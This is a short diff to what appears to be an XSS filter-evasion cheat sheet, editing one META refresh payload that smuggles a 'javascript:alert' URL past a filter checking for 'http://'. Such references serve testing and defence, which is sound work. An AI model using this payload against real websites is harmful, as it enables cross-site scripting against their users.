@@ -556,7 +556,7 @@ Directive URL scheme. This attack method is nice because it also doesn't have an
 If the target website attempts to see if the URL contains `<http://>;` at the beginning you can evade this filter rule with the following technique:
 
 ```html
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert%28'XSS');">
 ```
 
 (Submitted by Moritz Naumann)
